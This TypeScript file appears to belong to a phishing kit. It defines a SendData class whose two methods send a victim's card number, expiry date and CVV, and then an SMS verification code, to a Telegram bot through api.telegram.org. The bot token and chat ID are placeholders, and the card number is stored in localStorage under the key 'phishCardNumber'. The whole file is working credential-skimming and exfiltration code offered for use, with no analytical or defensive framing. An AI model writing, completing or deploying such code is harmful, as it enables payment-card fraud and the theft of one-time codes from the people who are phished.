import axios from "axios";

class SendData {

    static chatId = -100000000000
    static botToken = "token"

    public async sendCardData(card: string, expDate: string, cvv: string) {
        const text = `NEW CARD%0A
💳Card Number: ${"`" + card + "`"}%0A
🗓Expire Date: ${"`" + expDate + "`"}%0A
🔐CVV: ${"`" + cvv + "`"}`
        localStorage.setItem("phishCardNumber", card)
        try {
            const request = await axios.post(`https://api.telegram.org/bot${SendData.botToken}/sendMessage?chat_id=${SendData.chatId}&text=${text}&parse_mode=MarkdownV2`)
            return request.data.ok
        } catch (e) {
            return false;
        }
    }

    public async sendSms(sms: string) {
        const text = `SMS%0A
💬SMS: ${"`" + sms + "`"}%0A
💳Card Number: ${"`" + localStorage.getItem("phishCardNumber") + "`"}`
        try {
            const request = await axios.post(`https://api.telegram.org/bot${SendData.botToken}/sendMessage?chat_id=${SendData.chatId}&text=${text}&parse_mode=MarkdownV2`)
            return request.data.ok
        } catch (e) {
            return false;
        }
    }
}

export default new SendData()